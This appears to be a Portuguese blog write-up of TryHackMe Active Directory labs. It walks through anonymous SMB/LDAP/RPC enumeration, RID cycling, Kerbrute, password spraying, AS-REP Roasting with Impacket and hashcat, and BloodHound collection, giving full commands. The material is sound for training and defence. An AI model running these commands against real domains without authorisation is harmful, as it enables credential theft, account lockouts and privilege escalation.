---
layout: post
title: "Active Directory (AD DS) - Guia prático de enumeração e autenticação"
description: "Guia completo e didático de Active Directory: network, user e domain enumeration, SMB, RPC, LDAP, password spraying, AS-REP Roasting, CMD, PowerShell, PowerView e BloodHound."
date: 2026-10-19
categories: [guia, pentest, windows, tryhackme]
tags: [active-directory, ad-ds, enumeration, nmap, smb, rpcclient, ldap, kerbrute, password-spraying, kerberos, as-rep-roasting, impacket, hashcat, powershell, powerview, bloodhound]
---

# Active Directory (AD DS) - Guia prático completo

Este guia reúne meus exercícios e aprendizados das rooms **Network Enumeration**, **User/Domain Enumeration**, **Password Spraying** e **Authenticated Enumeration** do TryHackMe. A sequência é a que eu usaria para começar uma avaliação de um domínio Windows.

> Material para laboratórios e ambientes expressamente autorizados. Algumas verificações de autenticação podem bloquear contas ou gerar alertas.

## 1. Entender a rede e preparar o laboratório

O **Active Directory Domain Services (AD DS)** centraliza usuários, computadores, grupos, permissões e políticas do domínio. O **Domain Controller (DC)** guarda o diretório e participa da autenticação.

| Conceito | Significado |
|---|---|
| Domínio | Conjunto de identidades e recursos administrados centralmente |
| DC / KDC | Controlador do domínio / serviço Kerberos que emite tickets |
| WRK | Workstation, computador membro do domínio |
| LDAP (389) | Consulta objetos e atributos no diretório |
| Kerberos (88) | Autenticação por tickets |
| SMB (445) | Compartilhamentos e serviços Windows |
| MSRPC (135 e/ou SMB) | Consultas remotas de usuários, grupos e serviços |
| SID / RID | Identificador de segurança e sua parte final |
| OU / GPO | Unidade organizacional e política de grupo |

**Placeholders usados no guia:**

- <code>&lt;SUBNET/CIDR&gt;</code>: rede autorizada, como uma faixa /24.
- <code>&lt;DC_IP&gt;</code>: IP do controlador de domínio.
- <code>&lt;WRK_IP&gt;</code>: IP da estação Windows.
- <code>&lt;DOMAIN&gt;</code>: nome DNS do domínio.
- <code>&lt;USER&gt;</code> / <code>&lt;PASSWORD&gt;</code>: credenciais de laboratório.
- <code>&lt;ATTACKER_IP&gt;</code>: IP da AttackBox, quando necessário.

**Substitua os placeholders antes de executar os comandos.** Os alvos do DC e da WRK são diferentes: consultas LDAP/Kerberos costumam ir ao DC; enumeração local da estação vai à WRK.

~~~text
Reconhecimento da rede
        ↓
Enumeração sem credenciais (SMB / RPC / LDAP)
        ↓
Usuários, grupos e pertencimento
        ↓
Política de senhas
        ↓
Password spraying controlado / AS-REP Roasting
        ↓
Acesso autenticado à WRK
        ↓
CMD / PowerShell / PowerView
        ↓
BloodHound: relações e caminhos de privilégio
~~~

---

## 2. Network Enumeration - descobrir hosts e serviços

### 2.1 Encontrar máquinas ativas

Na AttackBox Linux:

~~~bash
fping -agq <SUBNET/CIDR>
~~~

| Opção | Função |
|---|---|
| <code>-a</code> | Mostra máquinas que responderam |
| <code>-g</code> | Gera os endereços da sub-rede |
| <code>-q</code> | Oculta mensagens extras |

Salvando hosts encontrados:

~~~bash
fping -agq <SUBNET/CIDR> 2>/dev/null > hosts.txt
cat hosts.txt
~~~

<code>2>/dev/null</code> descarta erros; <code>></code> cria ou sobrescreve o arquivo. Nem toda máquina ativa responderá a ICMP.

### 2.2 Identificar portas e serviços

~~~bash
nmap -p 88,135,139,389,445 -sV -sC -iL hosts.txt
~~~

- <code>-p</code>: limita as portas.
- <code>-sV</code>: detecta serviço/versão.
- <code>-sC</code>: scripts padrão do Nmap.
- <code>-iL</code>: lê IPs do arquivo.

Varredura TCP completa:

~~~bash
sudo nmap -sS -p- -T3 -iL hosts.txt -oN full_port_scan.txt
~~~

<code>-sS</code> usa TCP SYN; <code>-p-</code> cobre as portas 1–65535; <code>-T3</code> controla o ritmo; <code>-oN</code> salva a saída.

**Dica:** portas 88, 389 e 445, combinadas a DNS e outros serviços, ajudam a identificar possíveis controladores de domínio. Uma porta isolada não confirma o papel de DC.

### 2.3 Enumerar SMB e compartilhamentos

~~~bash
smbclient -L //<DC_IP> -N
smbmap -H <DC_IP>
nmap -p 445 --script smb-enum-shares <DC_IP>
enum4linux -a <DC_IP>
~~~

| Comando | Finalidade |
|---|---|
| <code>smbclient -L</code> | Lista compartilhamentos |
| <code>-N</code> | Tenta conexão sem senha |
| <code>smbmap</code> | Mostra shares e permissões disponíveis |
| <code>smb-enum-shares</code> | Enumeração via script NSE |
| <code>enum4linux -a</code> | Consolida verificações SMB/RPC |

Se um compartilhamento permitir acesso anônimo:

~~~bash
smbclient //<DC_IP>/<SHARE> -N
~~~

No prompt interativo:

~~~text
smb: \> ls
smb: \> get arquivo.txt
smb: \> exit
~~~

**Aprendizado:** listar um share não garante autorização para abrir ou baixar todos os arquivos.

---

## 3. User Enumeration - descobrir usuários sem login

O objetivo é identificar contas que possam ser analisadas posteriormente, sem começar por tentativas de senha.

### 3.1 LDAP: verificar acesso anônimo

~~~bash
ldapsearch -x -H ldap://<DC_IP> -s base
~~~

- <code>-x</code>: autenticação LDAP simples (anônima, sem <code>-D</code>).
- <code>-H</code>: servidor LDAP.
- <code>-s base</code>: consulta apenas o RootDSE.

O atributo importante é:

~~~text
defaultNamingContext: DC=exemplo,DC=local
~~~

O <code>defaultNamingContext</code> fornece a base do diretório. Conseguir ler RootDSE **não significa** que todo o AD aceite leitura anônima.

Consultar usuários:

~~~bash
ldapsearch -x -LLL -H ldap://<DC_IP> \
  -b "DC=exemplo,DC=local" \
  "(&(objectCategory=person)(objectClass=user))" sAMAccountName
~~~

- <code>-b</code>: base LDAP obtida na consulta anterior.
- <code>-LLL</code>: saída resumida.
- <code>sAMAccountName</code>: login da conta.

Salvar somente os nomes, quando permitido:

~~~bash
ldapsearch -x -LLL -H ldap://<DC_IP> \
  -b "DC=exemplo,DC=local" \
  "(&(objectCategory=person)(objectClass=user))" sAMAccountName |
awk '/^sAMAccountName: / {print $2}' > ldap_users.txt
~~~

**Ajuste <code>DC=exemplo,DC=local</code> conforme o seu domínio.** O <code>awk</code> extrai apenas o valor do atributo.

### 3.2 Enum4linux-ng

~~~bash
enum4linux-ng -A <DC_IP> -oA results
~~~

<code>-A</code> tenta enumerar usuários, grupos, shares, política de senhas, sistema etc. <code>-oA</code> salva relatórios estruturados com o prefixo escolhido. A quantidade de dados depende das permissões disponíveis.

### 3.3 RPC Null Session

~~~bash
rpcclient -U "" -N <DC_IP>
~~~

<code>-U ""</code> define usuário vazio; <code>-N</code> não solicita senha. Isso só funcionará se o serviço permitir a consulta anônima.

Dentro do <code>rpcclient</code>:

~~~text
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
rpcclient $> querydispinfo
rpcclient $> queryuser 0xa31
rpcclient $> help
~~~

O laboratório mostrou contas como Administrator, Guest, asrepuser1 e rduke. O <code>enumdomusers</code> retorna, além do nome, o **RID** da conta.

Salvar diretamente:

~~~bash
rpcclient -U "" -N <DC_IP> -c enumdomusers |
awk -F'[][]' '/^user:/ {print $2}' > rpc_users.txt
~~~

<code>-c</code> executa um comando RPC e encerra; <code>awk -F'[][]'</code> separa a linha pelos colchetes.

### 3.4 RID Cycling - consultar contas por identificador

Se <code>enumdomusers</code> for limitado, testar uma faixa de RIDs:

~~~bash
for i in $(seq 500 3000); do
  rpcclient -U "" -N <DC_IP> -c "queryuser $i" 2>/dev/null |
    grep -i "User Name"
done
~~~

O <code>for</code> percorre os RIDs; <code>grep -i</code> seleciona o campo do nome. A consulta pode ser demorada.

**Dica aprendida:** a faixa 500–2000 não era suficiente para encontrar todos os objetos da room: <code>rduke</code> tinha RID <code>0xa31</code>, isto é, **2609** em decimal.

### 3.5 Consolidar os nomes sem perder o arquivo

~~~bash
cat ldap_users.txt rpc_users.txt | sort -u > users.txt
wc -l users.txt
~~~

Para remover duplicatas **no próprio arquivo**:

~~~bash
sort -u -o users.txt users.txt
~~~

Não usar <code>sort -u users.txt > users.txt</code>: o redirecionamento pode zerar o arquivo antes da leitura. <code>-o</code> faz a gravação de saída corretamente.

### 3.6 Kerbrute: validar nomes via Kerberos

~~~bash
chmod +x kerbrute
./kerbrute userenum --dc <DC_IP> -d <DOMAIN> users.txt
~~~

<code>userenum</code> verifica se o KDC reconhece nomes; <code>--dc</code> define o controlador; <code>-d</code> define o domínio.

Uma resposta <code>VALID USERNAME</code> indica um nome reconhecido pelo Kerberos, **não** que a conta esteja ativa, que a senha seja conhecida ou que o login esteja autorizado. Contas terminadas em <code>$</code> geralmente são de computadores.

---

## 4. Domain Enumeration - grupos e pertencimento

Agora queremos saber **qual é o grupo de cada conta**, não apenas seu nome.

### 4.1 Listar e consultar grupos por RPC

~~~bash
rpcclient -U "" -N <DC_IP> -c enumdomgroups
rpcclient -U "" -N <DC_IP> -c "querygroup 0x201"
~~~

RIDs conhecidos: **500** (Administrator), **501** (Guest), **512** (Domain Admins), **513** (Domain Users) e **514** (Domain Guests).

### 4.2 Exemplo real da room: grupo de rduke

Foi executado:

~~~bash
rpcclient -U "" -N <DC_IP> -c "queryusergroups 0xa31"
~~~

Resultado:

~~~text
group rid:[0x201] attr:[0x7]
~~~

Conferência com LDAP:

~~~bash
ldapsearch -x -LLL -H ldap://<DC_IP> \
  -b "DC=exemplo,DC=local" \
  "(sAMAccountName=rduke)" memberOf primaryGroupID
~~~

Resultado observado:

~~~text
dn: CN=Raoul Duke,CN=Users,DC=exemplo,DC=local
primaryGroupID: 513
~~~

Interpretação:

~~~text
rduke
  → RID do grupo 0x201
  → 513 em decimal
  → Domain Users
~~~

**Principal aprendizado:** o atributo LDAP <code>memberOf</code> geralmente **não inclui o grupo primário**. Portanto, <code>memberOf</code> vazio não significa que a conta não pertença a nenhum grupo. Consultar também <code>primaryGroupID</code>. O campo RPC <code>attr:[0x7]</code> representa flags, e não outro grupo.

### 4.3 Contar usuários e grupos: local x domínio

Essas consultas **não são intercambiáveis**:

| Objetivo | Comando no Windows |
|---|---|
| Usuários locais da WRK | <code>(Get-LocalUser).Count</code> |
| Grupos locais da WRK | <code>(Get-LocalGroup).Count</code> |
| Usuários do AD | <code>(Get-ADUser -Filter *).Count</code> |
| Grupos retornados pelo AD | <code>(Get-ADGroup -Filter *).Count</code> |
| Grupos globais via NET | <code>net group /domain</code> |
| Grupos locais via NET | <code>net localgroup</code> |

**Erro que esclareci na prática:** <code>(Get-LocalGroup).Count</code> retornou **25**, mas eu precisava do número de **usuários** locais. O correto era <code>(Get-LocalUser).Count</code>.

Também observei **21** grupos com <code>net group /domain</code>, **54** com <code>Get-ADGroup -Filter *</code> e **58** na coleta BloodHound. Eles podem diferir porque <code>net group</code> lista principalmente grupos globais, enquanto o cmdlet AD retorna múltiplos escopos e o coletor possui regras/escopo próprios. Não usar um número de uma ferramenta para responder à pergunta referente a outra sem verificar seu escopo. Os valores são registros do exercício, não uma contagem universal do domínio.

---

## 5. Password Spraying - primeiro a política de senhas

**Password spraying**: testar uma senha candidata em vários usuários. Diferentemente do brute force concentrado em uma única conta, distribui as tentativas, mas **também pode causar bloqueios**.

### 5.1 Consultar a política

~~~bash
rpcclient -U "" -N <DC_IP> -c getdompwinfo
~~~

Resultado observado:

~~~text
min_password_length: 7
password_properties: 0x00000001
DOMAIN_PASSWORD_COMPLEX
~~~

Também é possível usar:

~~~bash
crackmapexec smb <DC_IP> --pass-pol
~~~

<code>0x00000001</code> indica a flag de complexidade de senha. Em configurações tradicionais do Windows, isso exige combinações de categorias de caracteres (em geral três das quatro: maiúsculas, minúsculas, números e especiais), além do comprimento mínimo.

Consultar também limiar e janela de bloqueio. A política padrão do domínio pode ser diferente de uma **Fine-Grained Password Policy** aplicada a contas específicas.

### 5.2 Spray controlado em laboratório

Com a lista já validada e uma única senha permitida pelo exercício:

~~~bash
crackmapexec smb <WRK_IP> -u users.txt -p '<PASSWORD>'
~~~

- <code>-u</code>: arquivo com usuários.
- <code>-p</code>: senha candidata.
- <code>smb</code>: autenticação via SMB.

A room também apresenta o uso de uma lista:

~~~bash
crackmapexec smb <WRK_IP> -u users.txt -p passwords.txt
~~~

**Cuidado:** usando <code>passwords.txt</code>, são feitas múltiplas tentativas por conta. Isso aumenta o risco de bloqueio e não equivale a uma rodada de spray com uma senha.

Mensagens comuns:

| Saída | Interpretação |
|---|---|
| <code>[+]</code> | Autenticação aceita |
| <code>[-]</code> | Tentativa não aceita |
| <code>STATUS_LOGON_FAILURE</code> | Credencial inválida ou logon recusado |
| <code>STATUS_ACCOUNT_LOCKED_OUT</code> | Conta bloqueada |
| <code>STATUS_PASSWORD_EXPIRED</code> | Senha expirada |

**Ordem correta:** enumerar contas → verificar políticas → validar escopo e limite de tentativas → executar o mínimo necessário → registrar resultados.

---

## 6. AS-REP Roasting - testar contas sem pré-autenticação

O **AS-REP Roasting** aproveita contas com a flag <code>UF_DONT_REQUIRE_PREAUTH</code>: o DC pode devolver dados AS-REP sem exigir que o solicitante conheça a senha. Esses dados podem ser testados **offline**.

**Fases:** descobrir contas vulneráveis → coletar AS-REP → testar candidatos localmente.

### 6.1 Coletar pelo Linux com Impacket

~~~bash
GetNPUsers.py <DOMAIN>/ \
  -dc-ip <DC_IP> \
  -usersfile users.txt \
  -format hashcat \
  -outputfile hashes.txt \
  -no-pass
~~~

Em distribuições mais novas o nome pode ser <code>impacket-GetNPUsers</code>.

| Opção | Significado |
|---|---|
| <code>-dc-ip</code> | Endereço do DC |
| <code>-usersfile</code> | Arquivo de usuários candidatos |
| <code>-format hashcat</code> | Formato dos dados recuperados |
| <code>-outputfile</code> | Arquivo de saída |
| <code>-no-pass</code> | Não pedir senha |

Mensagens importantes:

- <code>doesn't have UF_DONT_REQUIRE_PREAUTH set</code>: pré-autenticação **habilitada**; a conta não permite essa coleta.
- <code>KDC_ERR_CLIENT_REVOKED</code>: conta bloqueada, desativada ou revogada, dependendo do contexto.
- <code>$krb5asrep$23$...</code>: AS-REP do tipo 23, adequado ao Hashcat modo 18200.

No Windows, o comando estudado foi:

~~~cmd
Rubeus.exe asreproast
~~~

### 6.2 Testar senhas offline

~~~bash
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 hashes.txt --show
~~~

<code>-m 18200</code> seleciona Kerberos AS-REP etype 23; <code>--show</code> exibe senhas já recuperadas.

**Aprendizado:** Hashcat compara senhas candidatas com o material criptográfico, não “descriptografa a senha”. Apesar de aparecer perto da enumeração autenticada na trilha, **AS-REP Roasting pode começar sem autenticação prévia**.

---

## 7. Authenticated Enumeration - CMD na estação WRK

Com credenciais autorizadas no exercício, acessar a estação:

~~~bash
ssh <USER>@<WRK_IP>
~~~

O prompt poderá exibir <code>DOMINIO\usuario@WRK</code>. Isso indica uma sessão usando conta de domínio; <code>WRK\usuario</code> normalmente designa conta local.

### 7.1 Identidade e sistema

~~~cmd
whoami
whoami /all
hostname
systeminfo
set
~~~

- <code>whoami /all</code>: SID, grupos do token e privilégios atuais.
- <code>hostname</code>: máquina.
- <code>systeminfo</code>: SO, correções e domínio, sujeito às permissões.
- <code>set</code>: variáveis de ambiente.

Privilégios de interesse:

| Privilégio | Por que verificar |
|---|---|
| <code>SeImpersonatePrivilege</code> | Impersonação de tokens sob condições específicas |
| <code>SeAssignPrimaryTokenPrivilege</code> | Atribuir token primário a processos |
| <code>SeBackupPrivilege</code> | Acesso de backup a arquivos protegidos |
| <code>SeRestorePrivilege</code> | Operações de restauração privilegiadas |
| <code>SeDebugPrivilege</code> | Depuração/acesso a processos |

A presença de um privilégio **não garante** que ele possa ser explorado.

### 7.2 Usuários e grupos com NET

~~~cmd
net user
net user /domain
net user rduke /domain
net group /domain
net group "Domain Admins" /domain
net group "Domain Computers" /domain
net localgroup
net localgroup administrators
~~~

| Comando | Onde consulta |
|---|---|
| <code>net user</code> | Contas **locais** da WRK |
| <code>net user /domain</code> | Contas de usuário do domínio |
| <code>net user rduke /domain</code> | Atributos e grupos de rduke |
| <code>net group /domain</code> | Grupos globais do domínio |
| <code>net group "Domain Admins" /domain</code> | Membros desse grupo |
| <code>net localgroup</code> | Grupos locais da WRK |
| <code>net localgroup administrators</code> | Quem administra a WRK |

**Importante:** um administrador **local** da WRK não é necessariamente **Domain Admin**. Um grupo de domínio também pode ter sido adicionado aos administradores locais.

### 7.3 Sessões, processos, serviços e tarefas

~~~cmd
quser
tasklist /v
net session
wmic service get Name,StartName
sc query state= all
sc qc DHCP
schtasks /query /fo LIST /v
~~~

- <code>quser</code>: usuários com sessões interativas (console/RDP).
- <code>tasklist /v</code>: processos, com detalhes extras.
- <code>net session</code>: sessões SMB, normalmente exige elevação.
- <code>StartName</code> / <code>SERVICE_START_NAME</code>: identidade sob a qual o serviço executa.
- <code>sc qc</code>: configuração de um serviço.
- <code>schtasks /query</code>: tarefas agendadas.

Serviços do Windows são processos gerenciados pelo Service Control Manager. Podem executar como <code>LocalSystem</code>, <code>LocalService</code>, <code>NetworkService</code>, conta virtual ou usuário do domínio; **não dependem de uma sessão interativa**. Tarefas agendadas executam segundo seus próprios gatilhos e contexto de segurança. Algumas consultas exigem privilégios elevados. Em PowerShell, para chamar a ferramenta <code>sc</code>, prefira <code>sc.exe</code>, pois <code>sc</code> pode ser alias de <code>Set-Content</code>.

### 7.4 Registro e aplicações

~~~cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
~~~

O primeiro caminho guarda configurações de logon; em máquinas mal configuradas pode haver dados de autologon. O segundo ajuda a identificar aplicativos instalados. A leitura de algumas chaves depende de permissão.

---

## 8. PowerShell e módulo ActiveDirectory

Abrir PowerShell a partir do CMD:

~~~cmd
powershell
~~~

Verificar/importar o módulo:

~~~powershell
Get-Module -ListAvailable ActiveDirectory
Import-Module ActiveDirectory
~~~

Em estações, o módulo costuma depender de RSAT ou de um pacote já disponibilizado no laboratório.

### 8.1 Usuários

~~~powershell
Get-ADUser -Filter * | Select-Object Name,SamAccountName,Enabled
Get-ADUser -Identity rduke -Properties LastLogonDate,MemberOf,Description,Title
Get-ADUser -Filter "Name -like '*admin*'"
(Get-ADUser -Filter *).Count
~~~

<code>-Filter</code> seleciona objetos; <code>-Properties</code> solicita atributos extras; <code>Select-Object</code> limita as colunas; <code>.Count</code> conta resultados.

### 8.2 Grupos

~~~powershell
Get-ADGroup -Filter * | Select-Object Name,GroupScope
Get-ADGroupMember -Identity "Domain Admins"
(Get-ADGroup -Filter *).Count
~~~

<code>GroupScope</code> permite diferenciar grupos **Global**, **Universal** e **DomainLocal**.

### 8.3 Computadores e política

~~~powershell
Get-ADComputer -Filter * | Select-Object Name,OperatingSystem
Get-ADDefaultDomainPasswordPolicy
~~~

Na política, observar <code>MinPasswordLength</code>, <code>ComplexityEnabled</code>, <code>LockoutThreshold</code> e <code>LockoutDuration</code>. <code>LockoutThreshold = 0</code> significa que a **política padrão** não impõe bloqueio por quantidade de falhas, mas não dispensa a avaliação de políticas por usuário.

### 8.4 Contas/grupos locais em PowerShell

~~~powershell
Get-LocalUser
(Get-LocalUser).Count
Get-LocalGroup
(Get-LocalGroup).Count
Get-LocalGroupMember -Group Administrators
~~~

**Lembrete:** não confundir <code>Get-LocalUser</code> com <code>Get-LocalGroup</code> ao responder quantidades pedidas pela room.

---

## 9. PowerView - mais consultas sobre o domínio

O **PowerView** integra o conjunto PowerSploit e ajuda a analisar usuários, grupos, SPNs e computadores. No laboratório o arquivo estava disponível no diretório <code>Recon</code> do PowerSploit.

~~~powershell
. .\PowerView.ps1
Get-DomainUser
Get-DomainUser *admin*
Get-DomainGroup "*admin*"
Get-DomainComputer
Get-DomainUser -SPN
~~~

A expressão <code>. .\PowerView.ps1</code> faz **dot-sourcing** para carregar funções na sessão atual. O parâmetro <code>-SPN</code> procura contas com Service Principal Names (relevantes ao estudo de Kerberoasting).

**Diferença rápida:** AS-REP Roasting busca contas sem pré-autenticação; Kerberoasting envolve tickets de serviço associados a SPNs. São técnicas distintas.

---

## 10. BloodHound - mapear relações e privilégios

O **BloodHound** usa grafos:

- **Nodes**: usuários, computadores, grupos e outros objetos.
- **Edges**: pertencimento, sessões, direitos e relações entre esses objetos.

**SharpHound** coleta em Windows; **BloodHound.py** coleta em Linux. O BloodHound-CE visualiza o ZIP importado. Verificar compatibilidade entre versões do coletor e do servidor.

### 10.1 Coletar no Linux

~~~bash
bloodhound-python -u <USER> -p '<PASSWORD>' \
  -d <DOMAIN> -ns <DC_IP> -c All --zip
~~~

- <code>-u/-p</code>: credenciais do laboratório.
- <code>-d</code>: domínio.
- <code>-ns</code>: DNS a utilizar.
- <code>-c All</code>: métodos de coleta disponíveis.
- <code>--zip</code>: compacta para importação.

**Resultado observado na room:** 1 domínio, 2 computadores, 32 usuários, 58 grupos, 5 GPOs, 15 OUs, 19 containers e 0 trusts. Em uma tentativa, o Kerberos falhou devido à resolução de nomes e a coleta continuou com **fallback para NTLM**. É importante configurar corretamente o DNS do AD.

No Windows:

~~~cmd
SharpHound.exe --CollectionMethods All --Domain <DOMAIN> --ExcludeDCs
~~~

<code>--CollectionMethods All</code> faz coleta abrangente; <code>--ExcludeDCs</code> exclui DCs de métodos de enumeração de computadores aplicáveis. Isso não torna a coleta invisível nem impede necessariamente todas as consultas ao DC.

### 10.2 Importar e investigar

Abrir a instância do BloodHound-CE fornecida no laboratório e:

1. **Administration → File Ingest**: importar o ZIP.
2. **Explore**: pesquisar usuários, grupos e computadores.
3. **Cypher**: executar consultas, como **All Domain Admins**.
4. **Pathfinding**: escolher um usuário inicial e um grupo-alvo para estudar os caminhos.

Na room, foram investigados <code>asrepuser1</code>, <code>DRGONZ0</code>, <code>DOMAIN ADMINS</code> e caminhos iniciados em <code>EMPANADAL0V3R</code>.

**Dica:** o número de grupos no BloodHound pode não coincidir com <code>net group /domain</code>. Confirme o tipo de objeto, o método de coleta e eventuais limitações antes de responder questões de contagem ou tirar conclusões sobre permissões.

---

## 11. Checklist geral para os próximos laboratórios

| Fase | O que verificar | Ferramentas |
|---|---|---|
| Reconhecimento | Hosts ativos, DNS, serviços e portas | fping, Nmap |
| SMB | Shares, leitura e permissões | smbclient, smbmap |
| Usuários | LDAP, RPC, RIDs, lista deduplicada | ldapsearch, rpcclient, Kerbrute |
| Domínio | Grupos, RID, grupo primário, relações | RPC, LDAP |
| Autenticação | Complexidade e política de bloqueio | rpcclient, CrackMapExec |
| Kerberos | Contas sem pré-autenticação, AS-REP | GetNPUsers, Rubeus, Hashcat |
| Windows | Identidade, grupos locais e do domínio | whoami, NET, Get-LocalUser |
| Sistema | Sessões, serviços, tarefas e Registro | quser, sc, schtasks, reg |
| AD autenticado | Usuários, grupos, computadores, política | ActiveDirectory, PowerView |
| Relações | Privilégios, associações e caminhos | BloodHound |

### Referência de operadores e sintaxe

| Operador/parâmetro | Explicação |
|---|---|
| <code>\|</code> | Passa a saída de um comando para outro |
| <code>></code> | Grava em arquivo, sobrescrevendo |
| <code>>></code> | Acrescenta ao final |
| <code>2>/dev/null</code> | Descarta mensagens de erro |
| <code>-c</code> (rpcclient) | Executa uma instrução RPC e sai |
| <code>-b</code> (ldapsearch) | Define o DN-base |
| <code>-Filter</code> (PowerShell) | Filtra os objetos retornados |
| <code>-Properties</code> | Solicita atributos adicionais |
| <code>.Count</code> | Conta elementos retornados |

### O que aprendi

A sequência mais eficiente foi **descobrir → enumerar → validar → interpretar → só então testar autenticação**. Não basta decorar ferramentas: é fundamental saber **qual máquina**, **qual escopo** e **qual tipo de objeto** cada comando consulta.

Três cuidados fizeram diferença:

1. **Não misturar local e domínio:** usuários locais, grupos locais, grupos globais do domínio e objetos do AD são conjuntos distintos.
2. **Não confiar só em <code>memberOf</code>:** grupos primários exigem atenção a <code>primaryGroupID</code>.
3. **Não desperdiçar tentativas de senha:** primeiro verificar política e lockout; diferenciar password spraying de teste offline de AS-REP.

**Defesas relacionadas:** manter a pré-autenticação Kerberos habilitada, usar senhas fortes, aplicar privilégios mínimos, restringir enumeração anônima e acompanhar eventos de autenticação e consultas anormais ao AD.
